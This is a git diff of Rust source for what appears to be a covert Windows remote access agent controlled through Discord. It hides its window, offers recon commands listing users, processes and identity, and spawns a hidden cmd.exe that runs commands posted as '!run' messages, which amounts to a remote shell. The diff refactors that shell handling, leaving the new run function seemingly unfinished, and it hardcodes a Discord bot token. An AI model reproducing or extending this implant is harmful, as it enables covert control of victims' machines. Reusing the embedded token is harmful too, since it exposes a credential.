@@ -1,12 +1,7 @@
 #![windows_subsystem = "windows"]
 
-use std::io::{Read, Write};
-use std::os::windows::process::CommandExt;
-use std::sync::{Arc};
-use tokio::sync::Mutex;
 use std::sync::RwLock;
 use std::time::Duration;
-use std::process::{Child, Command, Stdio};
 use serenity::{
     async_trait, client::Context, model::{channel::{Message, ChannelType}, gateway::Ready, id::{ChannelId}, application::interaction::InteractionResponseType}, prelude::*,
     framework::standard::{
@@ -16,11 +11,17 @@ use serenity::{
 };
 use chrono::{DateTime, Utc};
 use uuid::Uuid;
-use serenity::framework::standard::Args;
-use tokio::io::AsyncBufReadExt;
+use std::io::{Read};
+use std::os::windows::io::AsRawHandle;
+use std::process::Child;
+
+use tokio::sync::Mutex;
+lazy_static::lazy_static! {
+    static ref CMD_PROCESS: Mutex<Option<Child>> = Mutex::new(None);
+}
+
 
 mod commands;
-
 use commands::recon::*;
 
 mod utils;
@@ -32,11 +33,6 @@ static AGENT_CAT_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
 static AGENT_COMMAND_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
 static CMD_SESSION_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
 
-struct CmdProcess;
-
-impl TypeMapKey for CmdProcess {
-    type Value = Arc<Mutex<Option<Child>>>;
-}
 
 #[group("info")]
 #[commands(c_userlist, c_tasklist, c_whoami)]
@@ -52,12 +48,6 @@ struct General;
 
 #[tokio::main]
 async fn main() {
-    // Initialize the CmdProcess
-    let cmd_process = Arc::new(Mutex::new(None));
-
-    // Add the CmdProcess to the TypeMap
-    let mut data = TypeMap::new();
-    data.insert::<CmdProcess>(cmd_process);
 
     // Configure the client with your Discord bot token in the environment.
     let token = String::from("MTA4NzQ2MzExMjY3ODA1NTkzNg.Gf19_l.w7FqiCApRPbPZWws6YVdRjUaT4jx7Ap_zJWlrY");
@@ -76,7 +66,6 @@ async fn main() {
         Client::builder(&token, intents)
             .event_handler(Handler)
             .framework(framework)
-            .type_map_insert::<CmdProcess>(Arc::clone(&data.get::<CmdProcess>().unwrap()))
             .await.expect("Error when creating the client");
 
     if let Err(why) = client.start().await {
@@ -232,20 +221,7 @@ async fn cmdsesh(ctx: &Context, msg: &Message) -> CommandResult {
                 .await
                 .unwrap();
             *CMD_SESSION_ID.write().unwrap() = Option::from(session_channel.id);
-
-            // Create the process object
-            let process = Command::new("cmd")
-                .stdin(Stdio::piped())
-                .stdout(Stdio::piped())
-                .stderr(Stdio::piped())
-                .creation_flags(0x08000000) // set CREATE_NO_WINDOW flag
-                .spawn()
-                .expect("failed to spawn cmd.exe process");
-
-            // Store the process object in the context data
-            let data = ctx.data.read().await;
-            let cmd_process = data.get::<CmdProcess>().expect("Failed to get CmdProcess");
-            *cmd_process.lock().await = Some(process);
+            create_cmd_process().await?;
 
             interaction
                 .create_interaction_response(&ctx, |r| {
@@ -275,41 +251,40 @@ async fn cmdsesh(ctx: &Context, msg: &Message) -> CommandResult {
     Ok(())
 }
 
+
 #[command]
-async fn run(ctx: &Context, msg: &Message, args: Args) -> CommandResult {
-    // Check if the message is in the designated channel and starts with the command prefix
-    let cmd_session_id = CMD_SESSION_ID.read().unwrap().clone();
+async fn run(ctx: &Context, msg: &Message) -> CommandResult {
+    if session_handler(msg)? {
+        let mut process = CMD_PROCESS.lock().await;
+        let mut buf = vec![];
 
-    if msg.channel_id != cmd_session_id.unwrap() {
-        return Ok(());
+        if let Some(process) = process.as_mut() {
+            use std::io::Write;
+            let content = msg.content.trim();
+            let command = content.strip_prefix("!run ").expect("Invalid command format").as_bytes();
+            match process.stdin.as_mut().unwrap().write_all(command) {
+                Err(why) => panic!("couldn't write to shell stdin: {}", why.to_string()),
+                Ok(_) => println!("send command to shell"),
+            }
+
+            // Because `stdin` does not live after the above calls, it is `drop`ed,
+            // and the pipe is closed.
+            //
+            // This is very important, otherwise `wc` wouldn't start processing the
+            // input we just sent.
+
+            use tokio::io::AsyncWriteExt;
+            let mut output = std::io::Cursor::new(Vec::new());
+            // The `stdout` field also has type `Option<ChildStdout>` so must be unwrapped.
+            match process.stdout.as_mut().unwrap().read_to_end(&mut buf) {
+                Err(why) => panic!("couldn't read shell stdout: {}", why.to_string()),
+                Ok(_) => AsyncWriteExt::write_all(&mut output, &buf).await.unwrap(),
+            };
+            let output_string = String::from_utf8(output.into_inner()).unwrap();
+
+            println!("{}", output_string)
+        }
     }
-
-    // Extract the command to run from the message
-    let command = msg.content.trim_start_matches("!run").trim();
-
-    // Get the process object from the context data
-    let data = ctx.data.read().await;
-    let cmd_process = data.get::<CmdProcess>().expect("Failed to get CmdProcess");
-    let mut process = cmd_process.lock().await;
-
-    // Check if process exists
-    if let Some(proc) = process.as_mut() {
-        // Send the user's command input to the process's stdin
-        let command = format!("{}\r\n", command);
-        proc.stdin.as_mut().unwrap().write_all(command.as_bytes()).expect("TODO: panic message");
-
-        // Read the output of the process
-        let mut stdout = proc.stdout.take().unwrap();
-        let mut stdout_data = String::new();
-        stdout.read_to_string(&mut stdout_data);
-
-        // Send the output to the channel
-        let response = format!("**stdout:**\n```\n{}\n```", stdout_data);
-        msg.channel_id.say(&ctx.http, response).await?;
-    } else {
-        msg.channel_id.say(&ctx.http, "No active command session found.").await?;
-    }
-
     Ok(())
 }
 
